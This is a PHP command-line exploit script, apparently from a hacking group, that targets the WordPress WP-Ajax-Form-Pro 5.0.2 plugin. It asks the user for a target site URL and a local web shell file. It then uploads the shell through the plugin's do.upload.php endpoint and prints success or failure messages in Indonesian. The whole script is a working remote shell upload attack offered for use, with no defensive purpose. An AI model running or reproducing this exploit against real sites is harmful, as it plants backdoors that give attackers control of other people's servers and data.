<?php


echo "

 __  __     _                          
 \ \/ /__ _(_)                         
  >  </ _` | |                         
 /_/\_\__,_|_|     _ _         _       
 / __|_  _ _ _  __| (_)__ __ _| |_ ___ 
 \__ \ || | ' \/ _` | / _/ _` |  _/ -_)
 |___/\_, |_||_\__,_|_\__\__,_|\__\___|
      |__/                             
\n";
echo "# Author : MarsHall\n";
echo "# Contact : syalpra@xaisyndicate.id\n";
echo "# Tools  : WordPress WP-Ajax-Form-Pro Plugins 5.0.2 Remote Shell Upload Vulnerability\n";
echo "[+] Submit Url : ";
$url = trim(fgets(STDIN));      
echo "[+] Your Shell : ";   
$shell = trim(fgets(STDIN));   
$file = new CURLFile(realpath($shell));
$up = array (
        'method' => 'POST',
        'file_afp[]' => $file,
        'submit' => 'UPLOAD'
        );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "$url/wp-content/plugins/wp-ajax-form-pro/ajax-form-app/uploader/do.upload.php?form_id=afp5&s=2019.11.20.14&c=5_5dd5472b6f41c3.09510355f8f3b6f7658194400a9d21753a6e8769");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible;)");   
    curl_setopt($ch, CURLOPT_HTTPHEADER,array('Content-Type: multipart/form-data'));
    curl_setopt($ch, CURLOPT_FRESH_CONNECT, 1);   
    curl_setopt($ch, CURLOPT_FORBID_REUSE, 1);  
    curl_setopt($ch, CURLOPT_TIMEOUT, 100);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $up);

    $result = curl_exec ($ch);
    
 // print_r($result);
   preg_match("/HTTP\/1.1 200/i", $result, $sukses);
   
   if (!empty($sukses)){
   
   echo "\n\n";
   echo "[+] $url\n";
   echo "[+] $shell => File Terupload\n";
   
   } else {
   
   echo "[×] $url => GAGAL\n";
   print_r($result);
   } 
